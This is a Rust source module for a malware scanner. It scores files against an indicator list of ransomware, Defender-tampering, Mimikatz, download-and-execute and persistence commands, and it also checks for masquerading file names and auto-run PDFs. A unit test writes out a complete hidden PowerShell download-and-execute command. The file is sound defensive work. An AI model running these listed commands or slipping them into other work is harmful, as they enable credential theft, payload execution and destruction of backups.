//! Score-based heuristics. Each analyzer emits [`Finding`]s; the scanner sums
//! the scores and compares them with the configured sensitivity thresholds.

use std::collections::HashMap;
use std::sync::OnceLock;

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Finding {
    pub score: i32,
    pub tag: &'static str,
    pub reason: String,
}

impl Finding {
    pub fn new(score: i32, tag: &'static str, reason: impl Into<String>) -> Self {
        Finding {
            score,
            tag,
            reason: reason.into(),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Sensitivity {
    Off,
    Low,
    #[default]
    Normal,
    High,
}

impl Sensitivity {
    /// (malicious, suspicious) score thresholds.
    pub fn thresholds(self) -> Option<(i32, i32)> {
        match self {
            Sensitivity::Off => None,
            Sensitivity::Low => Some((100, 70)),
            Sensitivity::Normal => Some((80, 50)),
            Sensitivity::High => Some((60, 35)),
        }
    }
}

pub fn total_score(findings: &[Finding]) -> i32 {
    findings.iter().map(|f| f.score).sum()
}

/// The tag with the highest accumulated positive score.
pub fn dominant_tag(findings: &[Finding]) -> &'static str {
    let mut by_tag: HashMap<&'static str, i32> = HashMap::new();
    for f in findings.iter().filter(|f| f.score > 0) {
        *by_tag.entry(f.tag).or_default() += f.score;
    }
    by_tag
        .into_iter()
        .max_by(|a, b| a.1.cmp(&b.1).then(b.0.cmp(a.0)))
        .map(|(t, _)| t)
        .unwrap_or("Generic")
}

// ---------------------------------------------------------------------------
// String indicators
// ---------------------------------------------------------------------------

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Scope {
    /// Scripts, macro source, shortcuts.
    Script,
    /// Every content type, including PE files.
    All,
}

struct Indicator {
    needle: &'static str,
    score: i32,
    tag: &'static str,
    reason: &'static str,
    scope: Scope,
}

const fn ind(
    needle: &'static str,
    score: i32,
    tag: &'static str,
    reason: &'static str,
    scope: Scope,
) -> Indicator {
    Indicator {
        needle,
        score,
        tag,
        reason,
        scope,
    }
}

use Scope::{All, Script as Scr};

/// Case-insensitive needles. Each is also searched in UTF-16LE form.
static INDICATORS: &[Indicator] = &[
    // Ransomware / anti-recovery
    ind(
        "vssadmin delete shadows",
        50,
        "Ransom",
        "deletes volume shadow copies",
        All,
    ),
    ind(
        "vssadmin.exe delete shadows",
        50,
        "Ransom",
        "deletes volume shadow copies",
        All,
    ),
    ind(
        "shadowcopy delete",
        50,
        "Ransom",
        "deletes shadow copies via WMI",
        All,
    ),
    ind(
        "win32_shadowcopy",
        25,
        "Ransom",
        "enumerates shadow copies via WMI",
        All,
    ),
    ind(
        "recoveryenabled no",
        40,
        "Ransom",
        "disables Windows recovery",
        All,
    ),
    ind(
        "bootstatuspolicy ignoreallfailures",
        35,
        "Ransom",
        "disables boot failure recovery",
        All,
    ),
    ind(
        "wbadmin delete catalog",
        45,
        "Ransom",
        "deletes the backup catalog",
        All,
    ),
    ind(
        "your files have been encrypted",
        40,
        "Ransom",
        "ransom note text",
        All,
    ),
    ind(
        "all your files are encrypted",
        40,
        "Ransom",
        "ransom note text",
        All,
    ),
    ind(
        "fsutil usn deletejournal",
        30,
        "Ransom",
        "deletes the NTFS change journal",
        All,
    ),
    // Anti-forensics / defense evasion
    ind(
        "wevtutil cl",
        30,
        "Evasion",
        "clears Windows event logs",
        All,
    ),
    ind(
        "amsiutils",
        60,
        "AmsiBypass",
        "references AMSI internals (AMSI bypass)",
        All,
    ),
    ind(
        "amsiinitfailed",
        60,
        "AmsiBypass",
        "AMSI bypass (amsiInitFailed)",
        All,
    ),
    ind(
        "amsiscanbuffer",
        30,
        "AmsiBypass",
        "references AmsiScanBuffer",
        Scr,
    ),
    ind(
        "disablerealtimemonitoring",
        45,
        "DefenderTamper",
        "disables Defender real-time monitoring",
        All,
    ),
    ind(
        "add-mppreference -exclusion",
        35,
        "DefenderTamper",
        "adds Defender exclusions",
        All,
    ),
    ind(
        "disableantispyware",
        40,
        "DefenderTamper",
        "disables Defender via policy",
        All,
    ),
    ind(
        "etweventwrite",
        20,
        "Evasion",
        "references ETW event writing (ETW patching)",
        Scr,
    ),
    // Credential theft tools
    ind("sekurlsa::", 80, "HackTool", "Mimikatz command syntax", All),
    ind("lsadump::", 80, "HackTool", "Mimikatz command syntax", All),
    ind(
        "invoke-mimikatz",
        80,
        "HackTool",
        "PowerSploit Invoke-Mimikatz",
        All,
    ),
    ind(
        "comsvcs.dll, minidump",
        60,
        "CredDump",
        "dumps process memory via comsvcs.dll",
        All,
    ),
    ind(
        "comsvcs.dll,minidump",
        60,
        "CredDump",
        "dumps process memory via comsvcs.dll",
        All,
    ),
    // Download & execute
    ind(
        "downloadstring(",
        30,
        "Downloader",
        "downloads a script into memory",
        Scr,
    ),
    ind("downloadfile(", 25, "Downloader", "downloads a file", Scr),
    ind("downloaddata(", 25, "Downloader", "downloads data", Scr),
    ind("net.webclient", 15, "Downloader", "uses Net.WebClient", Scr),
    ind(
        "invoke-webrequest",
        10,
        "Downloader",
        "uses Invoke-WebRequest",
        Scr,
    ),
    ind(
        "start-bitstransfer",
        15,
        "Downloader",
        "uses BITS transfer",
        Scr,
    ),
    ind("msxml2.xmlhttp", 20, "Downloader", "uses XMLHTTP", Scr),
    ind(
        "winhttp.winhttprequest",
        20,
        "Downloader",
        "uses WinHttpRequest",
        Scr,
    ),
    ind(
        "adodb.stream",
        20,
        "Downloader",
        "writes binary data with ADODB.Stream",
        Scr,
    ),
    ind(
        "urldownloadtofile",
        35,
        "Downloader",
        "uses URLDownloadToFile",
        All,
    ),
    ind(
        "certutil -urlcache",
        40,
        "Downloader",
        "abuses certutil to download",
        All,
    ),
    ind(
        "certutil.exe -urlcache",
        40,
        "Downloader",
        "abuses certutil to download",
        All,
    ),
    ind(
        "certutil -decode",
        20,
        "Dropper",
        "abuses certutil to decode payloads",
        All,
    ),
    ind(
        "bitsadmin /transfer",
        30,
        "Downloader",
        "abuses bitsadmin to download",
        All,
    ),
    ind(
        "/i:http",
        45,
        "Downloader",
        "regsvr32 remote scriptlet (Squiblydoo)",
        All,
    ),
    ind(
        "mshta http",
        35,
        "Downloader",
        "mshta executing a remote HTA",
        All,
    ),
    ind(
        "mshta vbscript:",
        35,
        "Dropper",
        "mshta executing inline VBScript",
        All,
    ),
    ind(
        "mshta javascript:",
        35,
        "Dropper",
        "mshta executing inline JavaScript",
        All,
    ),
    // Execution / obfuscation
    ind(
        "invoke-expression",
        20,
        "Obfuscated",
        "dynamic code execution (Invoke-Expression)",
        Scr,
    ),
    ind(
        "iex(",
        20,
        "Obfuscated",
        "dynamic code execution (iex)",
        Scr,
    ),
    ind(
        "iex (",
        20,
        "Obfuscated",
        "dynamic code execution (iex)",
        Scr,
    ),
    ind(
        "frombase64string",
        10,
        "Obfuscated",
        "decodes base64 at runtime",
        Scr,
    ),
    ind(
        "-encodedcommand",
        25,
        "Obfuscated",
        "PowerShell encoded command",
        All,
    ),
    ind(
        " -enc ",
        20,
        "Obfuscated",
        "PowerShell encoded command",
        All,
    ),
    ind(
        "-windowstyle hidden",
        15,
        "Obfuscated",
        "hides the PowerShell window",
        All,
    ),
    ind(
        "-w hidden",
        15,
        "Obfuscated",
        "hides the PowerShell window",
        All,
    ),
    ind(
        "-executionpolicy bypass",
        10,
        "Obfuscated",
        "bypasses execution policy",
        All,
    ),
    ind(
        "-ep bypass",
        10,
        "Obfuscated",
        "bypasses execution policy",
        All,
    ),
    ind("-nop ", 5, "Obfuscated", "PowerShell without profile", Scr),
    ind(
        "strreverse(",
        10,
        "Obfuscated",
        "reverses strings at runtime",
        Scr,
    ),
    ind("wscript.shell", 10, "Dropper", "uses WScript.Shell", Scr),
    ind(
        "shell.application",
        10,
        "Dropper",
        "uses Shell.Application",
        Scr,
    ),
    ind("powershell", 10, "Dropper", "launches PowerShell", Scr),
    ind("cmd.exe /c", 5, "Dropper", "launches cmd.exe", Scr),
    // In-memory shellcode loaders (PowerShell / VBA)
    ind(
        "virtualalloc",
        20,
        "ShellcodeLoader",
        "allocates executable memory",
        Scr,
    ),
    ind(
        "rtlmovememory",
        20,
        "ShellcodeLoader",
        "copies raw memory",
        Scr,
    ),
    ind(
        "createthread",
        15,
        "ShellcodeLoader",
        "creates threads from script",
        Scr,
    ),
    ind(
        "getdelegateforfunctionpointer",
        25,
        "ShellcodeLoader",
        "calls native function pointers",
        Scr,
    ),
    ind(
        "[system.reflection.assembly]::load",
        25,
        "ShellcodeLoader",
        "loads .NET assemblies from memory",
        Scr,
    ),
    // Persistence
    ind(
        "currentversion\\run",
        15,
        "Persistence",
        "writes Run-key autostart entries",
        Scr,
    ),
    ind(
        "schtasks /create",
        15,
        "Persistence",
        "creates scheduled tasks",
        Scr,
    ),
    ind(
        "schtasks.exe /create",
        15,
        "Persistence",
        "creates scheduled tasks",
        Scr,
    ),
    ind(
        "\\start menu\\programs\\startup",
        15,
        "Persistence",
        "writes into the Startup folder",
        Scr,
    ),
];

struct IndicatorSet {
    ac: AhoCorasick,
    /// Pattern id -> indicator index (each indicator has an ASCII and a UTF-16 form).
    owner: Vec<usize>,
}

fn indicator_set() -> &'static IndicatorSet {
    static SET: OnceLock<IndicatorSet> = OnceLock::new();
    SET.get_or_init(|| {
        let mut pats: Vec<Vec<u8>> = Vec::new();
        let mut owner = Vec::new();
        for (i, ind) in INDICATORS.iter().enumerate() {
            pats.push(ind.needle.as_bytes().to_vec());
            owner.push(i);
            pats.push(
                ind.needle
                    .encode_utf16()
                    .flat_map(|u| u.to_le_bytes())
                    .collect(),
            );
            owner.push(i);
        }
        let ac = AhoCorasickBuilder::new()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::Standard)
            .build(&pats)
            .expect("indicator automaton");
        IndicatorSet { ac, owner }
    })
}

/// Searches `data` for known malicious command/string indicators. Each
/// indicator contributes at most once.
pub fn string_indicators(data: &[u8], script_like: bool) -> Vec<Finding> {
    let set = indicator_set();
    let mut seen = vec![false; INDICATORS.len()];
    for m in set.ac.find_overlapping_iter(data) {
        seen[set.owner[m.pattern().as_usize()]] = true;
    }
    let mut out: Vec<Finding> = INDICATORS
        .iter()
        .zip(seen)
        .filter(|(ind, hit)| *hit && (script_like || ind.scope == Scope::All))
        .map(|(ind, _)| Finding::new(ind.score, ind.tag, ind.reason))
        .collect();
    if script_like {
        out.extend(obfuscation_metrics(data));
    }
    out
}

fn count_ci(haystack: &[u8], needle: &[u8]) -> usize {
    if needle.is_empty() || haystack.len() < needle.len() {
        return 0;
    }
    haystack
        .windows(needle.len())
        .filter(|w| w.eq_ignore_ascii_case(needle))
        .count()
}

/// Structural obfuscation signals typical of droppers.
fn obfuscation_metrics(data: &[u8]) -> Vec<Finding> {
    let mut out = Vec::new();
    // Long base64 runs (embedded payloads / encoded commands).
    let mut run = 0usize;
    let mut longest = 0usize;
    for &b in data {
        if b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=' {
            run += 1;
            longest = longest.max(run);
        } else {
            run = 0;
        }
    }
    if longest >= 1000 {
        out.push(Finding::new(
            20,
            "Obfuscated",
            format!("contains a {longest}-character base64 blob"),
        ));
    } else if longest >= 200 {
        out.push(Finding::new(
            10,
            "Obfuscated",
            format!("contains a {longest}-character base64 blob"),
        ));
    }
    let chr = count_ci(data, b"chr(") + count_ci(data, b"chrw(") + count_ci(data, b"[char]");
    if chr >= 40 {
        out.push(Finding::new(
            25,
            "Obfuscated",
            format!("{chr} character-code conversions"),
        ));
    }
    let concat = count_ci(data, b"\"+\"") + count_ci(data, b"'+'") + count_ci(data, b"\" & \"");
    if concat >= 40 {
        out.push(Finding::new(
            20,
            "Obfuscated",
            format!("{concat} string concatenations"),
        ));
    }
    out
}

// ---------------------------------------------------------------------------
// File name tricks
// ---------------------------------------------------------------------------

const DECOY_EXTENSIONS: &[&str] = &[
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "jpg", "jpeg", "png", "gif", "mp3",
    "mp4", "avi", "zip", "rar", "rtf", "csv",
];

pub fn filename_tricks(name: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let leaf = name.rsplit(['/', '\\']).next().unwrap_or(name);
    // Right-to-left override / isolate characters used to disguise extensions.
    if leaf.chars().any(|c| {
        matches!(
            c,
            '\u{202E}' | '\u{202D}' | '\u{2066}' | '\u{2067}' | '\u{2068}'
        )
    }) {
        out.push(Finding::new(
            50,
            "Masquerade",
            "file name contains bidirectional override characters",
        ));
    }
    let lower = leaf.to_ascii_lowercase();
    let parts: Vec<&str> = lower.split('.').collect();
    if parts.len() >= 3 {
        let last = parts[parts.len() - 1];
        let prev = parts[parts.len() - 2].trim_end();
        let executable = crate::filetype::EXECUTABLE_EXTENSIONS.contains(&last)
            || [
                "js", "jse", "vbs", "vbe", "hta", "bat", "cmd", "ps1", "lnk", "wsf",
            ]
            .contains(&last);
        if executable && DECOY_EXTENSIONS.contains(&prev) {
            out.push(Finding::new(
                35,
                "Masquerade",
                format!("double extension .{prev}.{last}"),
            ));
        }
    }
    if lower.contains("     .") {
        out.push(Finding::new(
            20,
            "Masquerade",
            "padding spaces hide the real extension",
        ));
    }
    out
}

// ---------------------------------------------------------------------------
// PDF
// ---------------------------------------------------------------------------

pub fn pdf(data: &[u8]) -> Vec<Finding> {
    let has = |n: &[u8]| data.windows(n.len()).any(|w| w == n);
    let mut out = Vec::new();
    let js = has(b"/JavaScript") || has(b"/JS");
    let auto = has(b"/OpenAction") || has(b"/AA");
    if js {
        out.push(Finding::new(20, "PDF", "contains JavaScript"));
    }
    if js && auto {
        out.push(Finding::new(
            20,
            "PDF",
            "runs JavaScript automatically on open",
        ));
    }
    if has(b"/Launch") {
        out.push(Finding::new(
            40,
            "PDF",
            "uses /Launch to start external programs",
        ));
    }
    if has(b"/EmbeddedFile") && auto {
        out.push(Finding::new(15, "PDF", "auto-action with embedded file"));
    }
    if has(b"/JBIG2Decode") && js {
        out.push(Finding::new(
            15,
            "PDF",
            "JBIG2 stream combined with JavaScript",
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn powershell_downloader_scores_high() {
        let s = b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\"";
        let f = string_indicators(s, true);
        assert!(total_score(&f) >= 80, "{f:?}");
        assert_eq!(dominant_tag(&f), "Downloader");
    }

    #[test]
    fn utf16_and_case_insensitive() {
        let wide: Vec<u8> = "VSSADMIN Delete Shadows /all /quiet"
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let f = string_indicators(&wide, false);
        assert_eq!(f[0].tag, "Ransom");
    }

    #[test]
    fn script_only_indicators_ignored_for_binaries() {
        assert!(string_indicators(b"uses net.webclient", false).is_empty());
        assert!(!string_indicators(b"uses net.webclient", true).is_empty());
    }

    #[test]
    fn benign_script_is_quiet() {
        let s = b"Get-ChildItem C:\\Logs | Where-Object { $_.Length -gt 1MB } | Remove-Item";
        assert!(total_score(&string_indicators(s, true)) < 50);
    }

    #[test]
    fn filename_double_extension_and_rtlo() {
        assert_eq!(
            filename_tricks("C:\\x\\Invoice.PDF.exe")[0].tag,
            "Masquerade"
        );
        assert!(!filename_tricks("photo\u{202E}gpj.exe").is_empty());
        assert!(filename_tricks("setup.1.2.exe").is_empty());
        assert!(filename_tricks("report.pdf").is_empty());
    }

    #[test]
    fn pdf_autorun_js() {
        let f = pdf(b"%PDF-1.4 /OpenAction 5 0 R /JS (app.alert(1)) /Launch");
        assert!(total_score(&f) >= 80);
    }
}
